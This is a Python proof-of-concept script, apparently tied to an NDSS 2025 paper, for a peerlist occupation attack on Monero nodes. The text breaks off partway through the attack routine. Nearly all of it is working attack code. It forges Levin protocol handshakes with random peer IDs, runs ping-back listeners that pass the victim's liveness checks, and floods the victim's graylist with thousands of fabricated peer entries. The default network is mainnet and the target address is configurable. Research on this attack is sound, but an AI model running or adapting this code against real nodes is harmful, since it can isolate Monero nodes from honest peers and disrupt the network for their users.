#!/usr/bin/env python3
"""
Monero Peerlist Occupation Attack - Proof of Concept (Simulate-only)
This script implements the simulated peerlist occupation attack against
Monero nodes. It keeps only the simulate path and supporting code.
For educational/research purposes only. Use responsibly in lab environments.
"""
import socket
import struct
import random
import time
import argparse
import threading
import logging
import concurrent.futures
from typing import Optional, Tuple
from dataclasses import dataclass
# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)
# =============================================================================
# Levin Protocol Constants
# =============================================================================
# The "magic number" signature that identifies a Levin message (8 bytes)
LEVIN_SIGNATURE = 0x0101010101012101
# P2P Command IDs (from src/p2p/p2p_protocol_defs.h)
CMD_HANDSHAKE = 1001
CMD_TIMED_SYNC = 1002
CMD_PING = 1003
CMD_REQUEST_SUPPORT_FLAGS = 1007
# Levin Header Flags
LEVIN_PACKET_REQUEST = 0x00000001
LEVIN_PACKET_RESPONSE = 0x00000002
# P2P Support Flags (from src/p2p/p2p_protocol_defs.h)
P2P_SUPPORT_FLAG_FLUFFY_BLOCKS = 0x01
P2P_SUPPORT_FLAGS_ALL = P2P_SUPPORT_FLAG_FLUFFY_BLOCKS

# =============================================================================
# Attack Configuration
# =============================================================================
@dataclass
class AttackConfig:
    """Configuration for the peerlist occupation attack."""
    num_fake_nodes: int = 100          # Number of fake nodes to simulate
    target_ip: str = "127.0.0.1"        # Target node IP
    target_port: int = 18080            # Target node P2P port
    claimed_port_base: int = 20000      # Base port for fake nodes (what we claim to listen on)
    source_port_base: int = 30000       # Base source port (actual outgoing connection port)
    delay_between_handshakes: float = 0.05  # Delay between handshakes (seconds)
    connection_timeout: float = 10.0    # Socket timeout
    max_concurrent: int = 3             # Max concurrent connections (low to avoid overwhelming victim)
    network: str = "mainnet"            # Network type
    keep_alive: bool = True             # Keep connections alive
    keep_alive_interval: float = 30.0   # Timed sync interval (seconds)
# =============================================================================
# Portable Storage Constants
# =============================================================================
# Portable Storage Header Signature
PORTABLE_STORAGE_SIGNATUREA = 0x01011101
PORTABLE_STORAGE_SIGNATUREB = 0x01020101
PORTABLE_STORAGE_FORMAT_VER = 1
# Portable Storage Type IDs
SERIALIZE_TYPE_INT64 = 1
SERIALIZE_TYPE_INT32 = 2
SERIALIZE_TYPE_INT16 = 3
SERIALIZE_TYPE_INT8 = 4
SERIALIZE_TYPE_UINT64 = 5
SERIALIZE_TYPE_UINT32 = 6
SERIALIZE_TYPE_UINT16 = 7
SERIALIZE_TYPE_UINT8 = 8
SERIALIZE_TYPE_DOUBLE = 9
SERIALIZE_TYPE_STRING = 10
SERIALIZE_TYPE_BOOL = 11
SERIALIZE_TYPE_OBJECT = 12
SERIALIZE_TYPE_ARRAY = 13
SERIALIZE_FLAG_ARRAY = 0x80
# =============================================================================
# Network IDs (16-byte UUIDs)
# =============================================================================
# Mainnet: 0x12, 0x30, 0xF1, 0x71, 0x61, 0x04, 0x41, 0x61, 0x17, 0x31, 0x00, 0x82, 0x16, 0xA1, 0xA1, 0x10
MAINNET_NETWORK_ID = bytes([0x12, 0x30, 0xF1, 0x71, 0x61, 0x04, 0x41, 0x61,
                            0x17, 0x31, 0x00, 0x82, 0x16, 0xA1, 0xA1, 0x10])
# Testnet: Last byte is 0x11 instead of 0x10
TESTNET_NETWORK_ID = bytes([0x12, 0x30, 0xF1, 0x71, 0x61, 0x04, 0x41, 0x61,
                            0x17, 0x31, 0x00, 0x82, 0x16, 0xA1, 0xA1, 0x11])
# Stagenet: Last byte is 0x12
STAGENET_NETWORK_ID = bytes([0x12, 0x30, 0xF1, 0x71, 0x61, 0x04, 0x41, 0x61,
                             0x17, 0x31, 0x00, 0x82, 0x16, 0xA1, 0xA1, 0x12])
# =============================================================================
# Helper Functions for Portable Storage Serialization
# =============================================================================
def pack_varint(value: int) -> bytes:
    """
    Pack an integer as a portable storage varint.
    The lowest 2 bits indicate the byte size:
      00 = 1 byte (values 0-63)
      01 = 2 bytes (values 64-16383)
      10 = 4 bytes (values 16384-1073741823)
      11 = 8 bytes (larger values)
    """
    if value <= 63:
        return struct.pack('<B', (value << 2) | 0)
    if value <= 16383:
        return struct.pack('<H', (value << 2) | 1)
    if value <= 1073741823:
        return struct.pack('<I', (value << 2) | 2)
    return struct.pack('<Q', (value << 2) | 3)

def pack_section_key(name: str) -> bytes:
    """Pack a section key (1-byte length prefix + string, max 255 chars)."""
    name_bytes = name.encode('utf-8')
    if len(name_bytes) > 255:
        raise ValueError("Section key too long (max 255 bytes)")
    return struct.pack('<B', len(name_bytes)) + name_bytes

def pack_string(value: str) -> bytes:
    """Pack a string (varint length prefix + string data)."""
    value_bytes = value.encode('utf-8')
    return pack_varint(len(value_bytes)) + value_bytes

def pack_blob(value: bytes) -> bytes:
    """Pack binary data as a string (varint length prefix + raw bytes)."""
    return pack_varint(len(value)) + value

class PortableStorageWriter:
    """Helper class to build portable storage binary format."""
    def __init__(self):
        self.entries = []
    def add_uint64(self, name: str, value: int):
        """Add a uint64 entry."""
        self.entries.append((name, SERIALIZE_TYPE_UINT64, struct.pack('<Q', value)))
    def add_uint32(self, name: str, value: int):
        """Add a uint32 entry."""
        self.entries.append((name, SERIALIZE_TYPE_UINT32, struct.pack('<I', value)))
    def add_uint16(self, name: str, value: int):
        """Add a uint16 entry."""
        self.entries.append((name, SERIALIZE_TYPE_UINT16, struct.pack('<H', value)))
    def add_uint8(self, name: str, value: int):
        """Add a uint8 entry."""
        self.entries.append((name, SERIALIZE_TYPE_UINT8, struct.pack('<B', value)))
    def add_string(self, name: str, value: str):
        """Add a string entry."""
        self.entries.append((name, SERIALIZE_TYPE_STRING, pack_string(value)))
    def add_blob(self, name: str, value: bytes):
        """Add a binary blob as a string entry."""
        self.entries.append((name, SERIALIZE_TYPE_STRING, pack_blob(value)))
    def add_object(self, name: str, obj: 'PortableStorageWriter'):
        """Add a nested object/section."""
        self.entries.append((name, SERIALIZE_TYPE_OBJECT, obj.serialize_entries()))
    def add_int64(self, name: str, value: int):
        """Add an int64 entry."""
        self.entries.append((name, SERIALIZE_TYPE_INT64, struct.pack('<q', value)))
    def add_object_array(self, name: str, objs: list) -> None:
        """Add an array of nested objects/sections."""
        data = pack_varint(len(objs))
        for obj in objs:
            data += obj.serialize_entries()
        self.entries.append((name, SERIALIZE_TYPE_OBJECT | SERIALIZE_FLAG_ARRAY, data))
    def serialize_entries(self) -> bytes:
        """Serialize just the entries (used for nested objects)."""
        data = pack_varint(len(self.entries))
        for name, type_id, value_data in self.entries:
            data += pack_section_key(name)
            data += struct.pack('<B', type_id)
            data += value_data
        return data
    def serialize(self) -> bytes:
        """Serialize the complete portable storage with header."""
        header = struct.pack(
            '<IIB',
            PORTABLE_STORAGE_SIGNATUREA,
            PORTABLE_STORAGE_SIGNATUREB,
            PORTABLE_STORAGE_FORMAT_VER
        )
        return header + self.serialize_entries()

# =============================================================================
# Monero Protocol Functions
# =============================================================================
def build_levin_header(payload_length: int, command: int,
                       expect_response: bool = True, is_response: bool = False,
                       return_code: int = 0) -> bytes:
    """
    Constructs the 33-byte Levin protocol header.
    Header structure (all little-endian):
      - Signature (uint64)       : 8 bytes - Magic number 0x0101010101012101
      - Payload Length (uint64)  : 8 bytes - Length of payload
      - Expect Response (bool)   : 1 byte  - Non-zero if response expected
      - Command ID (uint32)      : 4 bytes - Command identifier
      - Return Code (int32)      : 4 bytes - 0 for requests, >0 for successful responses
      - Flags (uint32)           : 4 bytes - 1=request, 2=response
      - Protocol Version (uint32): 4 bytes - Always 1
    """
    flags = LEVIN_PACKET_RESPONSE if is_response else LEVIN_PACKET_REQUEST
    version = 1
    return struct.pack(
        '<QQBiiiI',
        LEVIN_SIGNATURE,
        payload_length,
        int(expect_response),
        command,
        return_code,
        flags,
        version
    )

def build_handshake_payload(network_id: bytes, peer_id: int, my_port: int,
                            current_height: int = 1,
                            top_id: bytes = None,
                            cumulative_difficulty: int = 1) -> bytes:
    """
    Builds a valid Monero handshake payload using portable storage format.
    """
    # Default top_id to zeros (genesis-like)
    if top_id is None:
        top_id = bytes(32)
    # Build node_data section
    node_data = PortableStorageWriter()
    node_data.add_blob("network_id", network_id)
    node_data.add_uint64("peer_id", peer_id)
    node_data.add_uint32("my_port", my_port)
    node_data.add_uint16("rpc_port", 0)
    node_data.add_uint32("rpc_credits_per_hash", 0)
    node_data.add_uint32("support_flags", 1)  # P2P_SUPPORT_FLAG_FLUFFY_BLOCKS
    # Build payload_data section (CORE_SYNC_DATA)
    payload_data = PortableStorageWriter()
    payload_data.add_uint64("current_height", current_height)
    payload_data.add_uint64("cumulative_difficulty", cumulative_difficulty)
    payload_data.add_uint64("cumulative_difficulty_top64", 0)
    payload_data.add_blob("top_id", top_id)
    payload_data.add_uint8("top_version", 1)
    payload_data.add_uint32("pruning_seed", 0)
    # Build root object
    root = PortableStorageWriter()
    root.add_object("node_data", node_data)
    root.add_object("payload_data", payload_data)
    return root.serialize()

def parse_levin_header(data: bytes) -> Optional[Tuple[int, int, int, int, int, int, int]]:
    """Parse a 33-byte Levin header and return its fields."""
    if len(data) < 33:
        return None
    return struct.unpack('<QQBiiiI', data[:33])

def recv_all(sock: socket.socket, length: int, timeout: float = 5.0) -> bytes:
    """Receive exactly 'length' bytes from socket."""
    data = b''
    sock.settimeout(timeout)
    while len(data) < length:
        chunk = sock.recv(length - len(data))
        if not chunk:
            break
        data += chunk
    return data

def send_handshake(source_ip: Optional[str], target_ip: str, target_port: int,
                   network_id: bytes = MAINNET_NETWORK_ID,
                   verbose: bool = True) -> bool:
    """
    Connects to a Monero node and performs a Levin protocol handshake.
    """
    sock = None
    success = False
    try:
        # 1. Create and configure socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10.0)
        # Bind to specific source IP if provided (for multi-IP attacks)
        if source_ip:
            sock.bind((source_ip, 0))
            if verbose:
                print(f"[*] Bound to source IP: {source_ip}")
        # 2. Connect to target
        if verbose:
            print(f"[*] Connecting to {target_ip}:{target_port}...")
        sock.connect((target_ip, target_port))
        if verbose:
            print("[+] TCP connection established.")
        # 3. Generate random peer ID
        peer_id = random.getrandbits(64)
        # 4. Build handshake payload
        payload = build_handshake_payload(
            network_id=network_id,
            peer_id=peer_id,
            my_port=target_port, 
            current_height=1,
            cumulative_difficulty=1
        )
        # 5. Build complete message
        header = build_levin_header(len(payload), CMD_HANDSHAKE, expect_response=True)
        message = header + payload
        if verbose:
            print(f"[*] Sending handshake (payload: {len(payload)} bytes)...")
        sock.sendall(message)
        # 6. Receive response header
        response_header = recv_all(sock, 33)
        if len(response_header) < 33:
            if verbose:
                print("[-] Failed to receive complete response header.")
            return False
        parsed = parse_levin_header(response_header)
        if not parsed:
            if verbose:
                print("[-] Failed to parse response header.")
            return False
        res_sig, res_len, res_expect, res_cmd, res_code, res_flags, res_ver = parsed
        # 7. Validate response
        if res_sig != LEVIN_SIGNATURE:
            if verbose:
                print(f"[-] Invalid Levin signature in response: 0x{res_sig:016x}")
            return False
        if verbose:
            print(f"[+] Received valid Levin response!")
            print(f"    Command: {res_cmd}")
            print(f"    Payload length: {res_len} bytes")
            print(f"    Return code: {res_code}")
            print(f"    Flags: {res_flags}")
        # 8. Receive response payload (optional, for debugging)
        if res_len > 0 and res_len < 1024 * 1024:  # Sanity check: < 1MB
            response_payload = recv_all(sock, res_len)
            if verbose:
                print(f"[+] Received response payload: {len(response_payload)} bytes")
        success = (res_code >= 0)
        if verbose:
            if success:
                print("[+] Handshake successful!")
            else:
                print(f"[-] Handshake rejected (code: {res_code})")
    except socket.timeout:
        if verbose:
            print("[-] Connection timed out.")
    except socket.error as e:
        if verbose:
            print(f"[-] Socket error: {e}")
    except Exception as e:
        if verbose:
            print(f"[-] Unexpected error: {e}")
    finally:
        if sock:
            try:
                sock.close()
            except Exception:
                pass
    return success

def build_timed_sync_payload(current_height: int = 1,
                              cumulative_difficulty: int = 1,
                              top_id: bytes = None) -> bytes:
    """
    Builds a TIMED_SYNC payload.
    Used to keep the connection alive and maintain presence in peerlist.
    """
    if top_id is None:
        top_id = bytes(32)
    payload_data = PortableStorageWriter()
    payload_data.add_uint64("current_height", current_height)
    payload_data.add_uint64("cumulative_difficulty", cumulative_difficulty)
    payload_data.add_uint64("cumulative_difficulty_top64", 0)
    payload_data.add_blob("top_id", top_id)
    payload_data.add_uint8("top_version", 1)
    payload_data.add_uint32("pruning_seed", 0)
    root = PortableStorageWriter()
    root.add_object("payload_data", payload_data)
    return root.serialize()

def build_network_address(ip: str, port: int) -> PortableStorageWriter:
    """Build a portable storage object for a network_address (IPv4)."""
    addr = PortableStorageWriter()
    addr.add_uint8("type", 1)
    ip_addr = PortableStorageWriter()

    ip_value = struct.unpack('<I', socket.inet_aton(ip))[0]
    ip_addr.add_uint32("m_ip", ip_value)
    ip_addr.add_uint16("m_port", port)
    addr.add_object("addr", ip_addr)
    return addr

def build_peerlist_entry(ip: str, port: int, peer_id: int,
                         last_seen: int, pruning_seed: int = 0,
                         rpc_port: int = 0, rpc_credits_per_hash: int = 0) -> PortableStorageWriter:
    """Build a portable storage object for peerlist_entry."""
    entry = PortableStorageWriter()
    entry.add_object("adr", build_network_address(ip, port))
    entry.add_uint64("id", peer_id)
    entry.add_int64("last_seen", last_seen)
    entry.add_uint32("pruning_seed", pruning_seed)
    entry.add_uint16("rpc_port", rpc_port)
    entry.add_uint32("rpc_credits_per_hash", rpc_credits_per_hash)
    return entry

def build_timed_sync_response_payload(peer_entries: list) -> bytes:
    """Build a TIMED_SYNC response payload with a peerlist."""
    payload_data = PortableStorageWriter()
    payload_data.add_uint64("current_height", 1)
    payload_data.add_uint64("cumulative_difficulty", 1)
    payload_data.add_uint64("cumulative_difficulty_top64", 0)
    payload_data.add_blob("top_id", bytes(32))
    payload_data.add_uint8("top_version", 1)
    payload_data.add_uint32("pruning_seed", 0)
    root = PortableStorageWriter()
    root.add_object("payload_data", payload_data)
    root.add_object_array("local_peerlist_new", peer_entries)
    return root.serialize()

def build_timed_sync_response(peer_entries: list) -> bytes:
    """Build a COMMAND_TIMED_SYNC response message."""
    payload = build_timed_sync_response_payload(peer_entries)
    header = build_levin_header(
        len(payload), CMD_TIMED_SYNC, expect_response=False, is_response=True, return_code=1
    )
    return header + payload

def get_local_ip_for_target(target_ip: str) -> str:
    """Resolve the local IP address used to reach the target."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.connect((target_ip, 1))
        return sock.getsockname()[0]
    except OSError:
        return "127.0.0.1"
    finally:
        sock.close()

# =============================================================================
# Ping-Back Responder
# =============================================================================
_ping_peer_ids = {}
_ping_peer_ids_lock = threading.Lock()
_ping_success_count = 0
_ping_fail_count = 0
_ping_count_lock = threading.Lock()
_graylist_ports = set()
_timed_sync_peer_entries = {} 
def register_peer_id(port: int, peer_id: int):
    """Register a peer_id for a claimed port."""
    with _ping_peer_ids_lock:
        _ping_peer_ids[port] = peer_id

def build_ping_response(peer_id: int) -> bytes:
    """
    Build a COMMAND_PING response.
    The victim expects: status="OK", peer_id=<the peer_id from handshake>
    """
    root = PortableStorageWriter()
    root.add_string("status", "OK")
    root.add_uint64("peer_id", peer_id)
    payload = root.serialize()
    header = build_levin_header(
        len(payload), CMD_PING, expect_response=False, is_response=True, return_code=1
    )
    return header + payload

def handle_ping_connection(conn: socket.socket, port: int):
    """Handle a single ping-back connection from the victim node."""
    global _ping_success_count, _ping_fail_count
    try:
        conn.settimeout(5.0)
        peer_addr = conn.getpeername()
        logger.info(f"[PING-BACK] Incoming connection on port {port} from {peer_addr[0]}:{peer_addr[1]}")
        while True:
            # Read Levin header (33 bytes)
            data = recv_all(conn, 33, timeout=5.0)
            if len(data) == 0:
                break
            if len(data) < 33:
                logger.warning(f"[PING-BACK] Port {port}: Incomplete header ({len(data)} bytes)")
                with _ping_count_lock:
                    _ping_fail_count += 1
                break
            parsed = parse_levin_header(data)
            if not parsed:
                logger.warning(f"[PING-BACK] Port {port}: Failed to parse Levin header")
                with _ping_count_lock:
                    _ping_fail_count += 1
                break
            sig, payload_len, _, cmd, _, _, _ = parsed
            if sig != LEVIN_SIGNATURE:
                logger.warning(f"[PING-BACK] Port {port}: Invalid signature 0x{sig:016x}")
                with _ping_count_lock:
                    _ping_fail_count += 1
                break
                logger.info(f"[PING-BACK] Port {port}: Received command {cmd}, payload {payload_len} bytes")
            # Read payload (if any)
            if payload_len > 0 and payload_len < 65536:
                recv_all(conn, payload_len, timeout=5.0)
            if cmd == CMD_PING:
                with _ping_peer_ids_lock:
                    peer_id = _ping_peer_ids.get(port, 0)
                response = build_ping_response(peer_id)
                conn.sendall(response)
                with _ping_count_lock:
                    _ping_success_count += 1
                    count = _ping_success_count
                    logger.info(f"[PING-BACK] Port {port}: Sent pong (peer_id={peer_id:#x}) -- total pongs sent: {count}")
                continue
            if cmd == CMD_TIMED_SYNC:
                logger.info(f"[PING-BACK] Port {port}: Timed sync request received")
                port_entries = _timed_sync_peer_entries.get(port, [])
                if port in _graylist_ports and port_entries:
                    response = build_timed_sync_response(port_entries)
                    conn.sendall(response)
                    logger.info(
                        f"[PING-BACK] Port {port}: Timed sync response sent with "
                        f"{len(port_entries)} peers"
                    )
                continue
            logger.warning(f"[PING-BACK] Port {port}: Unexpected command {cmd}")
            with _ping_count_lock:
                _ping_fail_count += 1
            break
    except Exception as e:
        logger.warning(f"[PING-BACK] Port {port}: Error -- {e}")
        with _ping_count_lock:
            _ping_fail_count += 1
    finally:
        try:
            conn.close()
        except Exception:
            pass

def start_ping_listener(port: int) -> Optional[socket.socket]:
    """Start a listening socket on the given port to handle ping-backs."""
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(('0.0.0.0', port))
        srv.listen(5)
        srv.settimeout(0.5)
        return srv
    except OSError as e:
        logger.debug(f"Cannot listen on port {port}: {e}")
        return None

def run_ping_listeners(listeners: dict, stop_event: threading.Event):
    """
    Run all ping listeners using select() for efficient polling.
    listeners: {port: server_socket}
    """
    import select
    # Build reverse lookup: socket -> port
    sock_to_port = {srv: port for port, srv in listeners.items()}
    while not stop_event.is_set():
        try:
            # Wait for any listener to have an incoming connection (100ms timeout)
            readable, _, _ = select.select(list(listeners.values()), [], [], 0.1)
            for srv in readable:
                try:
                    conn, addr = srv.accept()
                    port = sock_to_port[srv]
                    t = threading.Thread(target=handle_ping_connection, args=(conn, port), daemon=True)
                    t.start()
                except Exception:
                    continue
        except Exception:
            continue

def perform_simulated_handshake(config: AttackConfig, network_id: bytes,
                                claimed_port: int, peer_id: int,
                                source_port: int) -> bool:
    """Perform a single simulated handshake flow for a fake node."""
    sock = None
    try:
        # 1. Connect
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(config.connection_timeout)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('', source_port))
        sock.connect((config.target_ip, config.target_port))
        # 2. Send handshake (this triggers victim to ping-back our claimed_port)
        payload = build_handshake_payload(
            network_id=network_id,
            peer_id=peer_id,
            my_port=claimed_port,
            current_height=1,
            cumulative_difficulty=1
        )
        header = build_levin_header(len(payload), CMD_HANDSHAKE, expect_response=True)
        sock.sendall(header + payload)
        # 3. Receive handshake response
        response_header = recv_all(sock, 33, timeout=5.0)
        if len(response_header) < 33:
            return False
        parsed = parse_levin_header(response_header)
        if not parsed:
            return False
        res_sig, res_len, _, res_cmd, res_code, res_flags, _ = parsed
        is_response = (res_flags & LEVIN_PACKET_RESPONSE) != 0
        if not (res_sig == LEVIN_SIGNATURE and res_cmd == CMD_HANDSHAKE and is_response):
            logger.debug(f"Simulated handshake (port {claimed_port}): Invalid response sig={res_sig:#x} cmd={res_cmd} flags={res_flags:#x}")
            return False
        # Read response payload
        if res_len > 0 and res_len < 1024 * 1024:
            recv_all(sock, res_len, timeout=5.0)
        # 4. Wait for victim's ping-back to complete
        time.sleep(2)
        return True
    except socket.error as e:
        logger.debug(f"Simulated handshake (port {claimed_port}): {e}")
        return False
    finally:
        if sock:
            try:
                sock.close()
            except Exception:
                pass

def wait_for_timed_sync(sock: socket.socket, timeout_seconds: float, port: int) -> bool:
    """Wait for a timed sync request on an established connection and respond."""
    deadline = time.time() + timeout_seconds
    sock.settimeout(5.0)
    logger.info(f"[GRAYLIST] Port {port}: Entering timed sync wait loop (timeout={timeout_seconds}s)")
    while time.time() < deadline:
        remaining = deadline - time.time()
        try:
            data = recv_all(sock, 33, timeout=min(5.0, remaining))
            if len(data) == 0:
                logger.warning(f"[GRAYLIST] Port {port}: Connection closed by peer (0 bytes)")
                return False
            if len(data) < 33:
                logger.warning(f"[GRAYLIST] Port {port}: Incomplete header ({len(data)} bytes)")
                return False
            parsed = parse_levin_header(data)
            if not parsed:
                logger.warning(f"[GRAYLIST] Port {port}: Failed to parse Levin header")
                return False
            sig, payload_len, have_to_return, cmd, ret_code, flags, _ = parsed
            if sig != LEVIN_SIGNATURE:
                logger.warning(f"[GRAYLIST] Port {port}: Invalid signature 0x{sig:016x}")
                return False
            is_request = (flags & LEVIN_PACKET_REQUEST) != 0
            logger.info(f"[GRAYLIST] Port {port}: Received cmd={cmd}, payload={payload_len}B, "
                       f"is_request={is_request}, have_to_return={have_to_return}")
            # Read payload
            payload_data = b''
            if payload_len > 0 and payload_len < 65536:
                payload_data = recv_all(sock, payload_len, timeout=5.0)
            if cmd == CMD_TIMED_SYNC:
                logger.info(f"[GRAYLIST] Port {port}: TIMED_SYNC request received!")
                entries = _timed_sync_peer_entries.get(port, [])
                response = build_timed_sync_response(entries)
                sock.sendall(response)
                # Log first and last peerlist entry details
                if entries:
                    # Extract IP from first entry's serialized data for logging
                    first_e = entries[0].entries  # list of (name, type, data)
                    last_e = entries[-1].entries
                    def _extract_ip_port(e):
                        for name, _, data in e:
                            if name == "adr":
                                return data.hex()[:60]
                        return "?"
                    logger.info(f"[GRAYLIST] Port {port}: Sent {len(entries)} peers ({len(response)} bytes)")
                    logger.info(f"[GRAYLIST] Port {port}: First entry adr data: {_extract_ip_port(first_e)}")
                    logger.info(f"[GRAYLIST] Port {port}: Last entry adr data:  {_extract_ip_port(last_e)}")
                return True
            elif cmd == CMD_REQUEST_SUPPORT_FLAGS:
                logger.info(f"[GRAYLIST] Port {port}: Support flags request, sending response...")
                root = PortableStorageWriter()
                root.add_uint32("support_flags", P2P_SUPPORT_FLAG_FLUFFY_BLOCKS)
                sf_payload = root.serialize()
                sf_header = build_levin_header(len(sf_payload), CMD_REQUEST_SUPPORT_FLAGS,
                                              expect_response=False, is_response=True, return_code=1)
                sock.sendall(sf_header + sf_payload)
                continue
            else:
                logger.info(f"[GRAYLIST] Port {port}: Ignoring command {cmd}, continuing to wait...")
                continue
        except socket.timeout:
            continue
        except socket.error as e:
            logger.warning(f"[GRAYLIST] Port {port}: Socket error during wait - {e}")
            return False
    logger.warning(f"[GRAYLIST] Port {port}: Timed sync request not received before timeout ({timeout_seconds}s)")
    return False

def perform_graylist_handshake_and_wait(config: AttackConfig, network_id: bytes,
                                        claimed_port: int, peer_id: int,
                                        source_port: int, wait_seconds: float) -> bool:
    """Perform handshake and keep connection open for timed sync."""
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(90.0)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('', source_port))
        sock.connect((config.target_ip, config.target_port))
        logger.info(f"[GRAYLIST] Port {claimed_port}: Connected to {config.target_ip}:{config.target_port}")
        payload = build_handshake_payload(
            network_id=network_id,
            peer_id=peer_id,
            my_port=claimed_port,
            current_height=1,
            cumulative_difficulty=1
        )
        header = build_levin_header(len(payload), CMD_HANDSHAKE, expect_response=True)
        sock.sendall(header + payload)
        logger.info(f"[GRAYLIST] Port {claimed_port}: Handshake sent, waiting for response...")
        # Victim's handle_handshake calls try_ping back to us before responding,
        # which can take 10+ seconds especially under concurrent load
        response_header = recv_all(sock, 33, timeout=90.0)
        if len(response_header) < 33:
            logger.warning(f"[GRAYLIST] Port {claimed_port}: Incomplete response header ({len(response_header)} bytes)")
            return False
        parsed = parse_levin_header(response_header)
        if not parsed:
            logger.warning(f"[GRAYLIST] Port {claimed_port}: Failed to parse response header")
            return False
        res_sig, res_len, _, res_cmd, res_code, res_flags, _ = parsed
        is_response = (res_flags & LEVIN_PACKET_RESPONSE) != 0
        logger.info(f"[GRAYLIST] Port {claimed_port}: Response - cmd={res_cmd}, code={res_code}, flags={res_flags:#x}, is_response={is_response}")
        if not (res_sig == LEVIN_SIGNATURE and res_cmd == CMD_HANDSHAKE and is_response):
            logger.warning(f"[GRAYLIST] Port {claimed_port}: Invalid handshake response (sig={res_sig:#x}, cmd={res_cmd}, is_response={is_response})")
            return False
        if res_len > 0 and res_len < 1024 * 1024:
            recv_all(sock, res_len, timeout=5.0)
        logger.info(f"[GRAYLIST] Port {claimed_port}: Handshake complete, waiting for ping-back...")
        time.sleep(2)
        logger.info(f"[GRAYLIST] Port {claimed_port}: Now waiting up to {wait_seconds}s for timed sync...")
        return wait_for_timed_sync(sock, wait_seconds, claimed_port)
    except socket.timeout as e:
        logger.warning(f"[GRAYLIST] Port {claimed_port}: Timeout error (connect or handshake took >90s) - {e}")
        return False
    except socket.error as e:
        logger.warning(f"[GRAYLIST] Port {claimed_port}: Socket error - {e}")
        return False
    finally:
        if sock:
            try:
                sock.close()
            except Exception:
                pass

def simulated_peerlist_occupation_attack(config: AttackConfig):
    """
    Whitelist Occupation Attack (Algorithm 1, lines 17-21 from NDSS 2025 paper).
    For each fake node:
      1. connect(target_node)
      2. send handshake (triggers victim's ping-back to our listener)
      3. listener responds with pong (status="OK", peer_id)
      4. victim adds us to whitelist
      5. disconnect
    Ping-back listeners must be running BEFORE handshakes start.
    """
    logger.info("=" * 70)
    logger.info("Whitelist Occupation Attack (NDSS 2025 Paper)")
    logger.info("=" * 70)
    logger.info(f"Target: {config.target_ip}:{config.target_port}")
    logger.info(f"Number of fake nodes: {config.num_fake_nodes}")
    logger.info(f"Network: {config.network}")
    logger.info("=" * 70)
    # Select network ID
    network_ids = {
        'mainnet': MAINNET_NETWORK_ID,
        'testnet': TESTNET_NETWORK_ID,
        'stagenet': STAGENET_NETWORK_ID
    }
    network_id = network_ids[config.network]
    # Generate peer_ids for all fake nodes upfront
    nodes_info = []
    for i in range(config.num_fake_nodes):
        claimed_port = config.claimed_port_base + i
        peer_id = random.getrandbits(64)
        nodes_info.append((i, claimed_port, peer_id))
    graylist_nodes = nodes_info[:20]
    whitelist_nodes = nodes_info[20:]
    whitelist_ports = [port for _, port, _ in whitelist_nodes]
    if whitelist_ports:
        base_trash_port = whitelist_ports[0]
        max_trash_port = whitelist_ports[-1]
    else:
        base_trash_port = config.claimed_port_base + 20
        max_trash_port = base_trash_port
    # Build per-connection peerlists with unique IPs for each graylist connection.
    # Connection on port 20000 sends 44.44.0.1-250, port 20001 sends 44.44.1.1-250, etc.
    # This gives 20 x 250 = 5000 unique entries to fill the graylist.
    now = int(time.time())
    per_port_peer_entries = {}
    for conn_idx, (_, claimed_port, _) in enumerate(graylist_nodes):
        entries = []
        for i in range(250):
            d = i + 1  # 1-250
            fake_ip = f"44.44.{conn_idx}.{d}"
            fake_port = 20000 + conn_idx
            entries.append(
                build_peerlist_entry(fake_ip, fake_port, random.getrandbits(64), now)
            )
        per_port_peer_entries[claimed_port] = entries
        logger.info(f"[GRAYLIST] Port {claimed_port}: peerlist 44.44.{conn_idx}.1-250:{fake_port} (250 entries)")
    global _graylist_ports, _timed_sync_peer_entries
    _graylist_ports = {port for _, port, _ in graylist_nodes}
    _timed_sync_peer_entries = per_port_peer_entries
    # ---- Phase 0: Start ping-back listeners on ALL claimed ports ----
    logger.info("\n[Phase 0] Starting ping-back listeners...")
    ping_listeners = {}
    stop_ping = threading.Event()
    for _, claimed_port, peer_id in nodes_info:
        register_peer_id(claimed_port, peer_id)
        srv = start_ping_listener(claimed_port)
        if srv:
            ping_listeners[claimed_port] = srv
            logger.info(f"Listening on {len(ping_listeners)}/{config.num_fake_nodes} ports "
                f"({config.claimed_port_base}-{config.claimed_port_base + config.num_fake_nodes - 1})")
    if len(ping_listeners) == 0:
        logger.error("No ping listeners could be started! Check if ports are available.")
        return 0, config.num_fake_nodes
    # Start ping listener thread
    ping_thread = threading.Thread(target=run_ping_listeners, args=(ping_listeners, stop_ping), daemon=True)
    ping_thread.start()
    # Small delay to ensure listeners are ready
    time.sleep(0.5)
    # ---- Phase 1: Graylist attack - connect, handshake, wait for ping/timed sync ----
    logger.info("\n[Phase 1] Graylist attack: connect -> handshake -> pong -> timed sync")
    gray_successful = 0
    gray_failed = 0
    # Use a thread pool to perform graylist handshakes concurrently
    max_workers = max(1, min(config.max_concurrent, len(graylist_nodes)))
    futures = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as exc:
        for idx, (node_id, claimed_port, peer_id) in enumerate(graylist_nodes):
            source_port = config.source_port_base + node_id
            wait_seconds = max(60.0, float(config.keep_alive_interval))
            fut = exc.submit(
                perform_graylist_handshake_and_wait,
                config, network_id, claimed_port, peer_id, source_port, wait_seconds
            )
            futures[fut] = (node_id, claimed_port, peer_id)
            # Small pacing between submissions to avoid bursting
            if config.delay_between_handshakes > 0:
                time.sleep(config.delay_between_handshakes)
        # Collect results as they complete
        for fut in concurrent.futures.as_completed(futures):
            node_id, claimed_port, peer_id = futures[fut]
            try:
                result = fut.result()
                if result:
                    gray_successful += 1
                    logger.info(f"[Phase1] Graylist node {claimed_port} succeeded")
                else:
